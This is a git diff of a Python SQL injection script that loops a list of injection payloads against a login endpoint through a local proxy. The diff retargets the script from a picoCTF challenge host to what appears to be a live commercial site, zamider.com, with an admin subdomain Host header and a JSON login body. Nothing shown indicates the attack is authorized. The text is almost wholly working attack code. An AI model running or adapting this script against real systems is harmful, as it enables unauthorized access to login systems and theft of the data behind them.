@@ -8,7 +8,7 @@ proxies={
     'https':'http://127.0.0.1:8080',
 }
 
-url="http://shape-facility.picoctf.net:53633/index.php"
+url="https://zamider.com/login"
 
 
 payloads = [
@@ -133,30 +133,60 @@ payloads = [
     "' OR ASCII(SUBSTRING('a',1,1))=97--",
 ]
 
+# headers = {
+#     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
+#     "Referer": "http://shape-facility.picoctf.net:53633/index.php",
+#     "Origin": "http://shape-facility.picoctf.net:53633",
+#     "Content-Type": "application/x-www-form-urlencoded"
+# }
 headers = {
+    "Host": "admin.zamider.com",
+    "Content-Length": "108",
+    "Sec-Ch-Ua-Platform": '"macOS"',
+    "Accept-Language": "en-US,en;q=0.9",
+    "Accept": "application/json",
+    "Sec-Ch-Ua": '"Not-A.Brand";v="24", "Chromium";v="146"',
+    "Content-Type": "application/json",
+    "Sec-Ch-Ua-Mobile": "?0",
     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36",
-    "Referer": "http://shape-facility.picoctf.net:53633/index.php",
-    "Origin": "http://shape-facility.picoctf.net:53633",
-    "Content-Type": "application/x-www-form-urlencoded"
+    "Origin": "https://zamider.com",
+    "Sec-Fetch-Site": "same-site",
+    "Sec-Fetch-Mode": "cors",
+    "Sec-Fetch-Dest": "empty",
+    "Referer": "https://zamider.com/",
+    "Accept-Encoding": "gzip, deflate, br",
+    "Priority": "u=1, i"
 }
 
-cookies = {
-    "PHPSESSID": "d4693bbc8771c53ca7f63b2186eaa55b"
-}
+
+
+
+
+# cookies = {
+#     "PHPSESSID": "d4693bbc8771c53ca7f63b2186eaa55b"
+# }
 
 
 
 for payload in payloads:
-    params={
-        'user':f'{payload}',
-        'pass':'admin'
-    }
-    r=requests.post(url,data=params,headers=headers,cookies=cookies,verify=False,proxies=proxies)
+    data = {
+    "login": f"{payload}",
+    "password": "aaaaaa",
+    "session_id": "anon-TW96aWxsYS81LjAg-nrtbnfh",
+    "email": "aa",
+    "username": "aa"
+}
+    # params={
+    #     'user':f'{payload}',
+    #     'pass':'admin'
+    # }
+    r=requests.post(url,json=data,headers=headers,verify=False,proxies=proxies)
     print(f"Status Code: {r.status_code}")
-    if "Invalid" in r.text:
-        print(f"\n\nResponse : Invalid for Payload = {payload}\n\n")
-    elif "Congrats" in r.text:
-        print(f"\n\nResponse : Congrats for payload = {payload}\n\n")
+    if "Invalid" not in r.text:
+        print(f"\n\nResponse : {r.text}")
+    else:
+        print("Invalid")
+    break
     
 
 
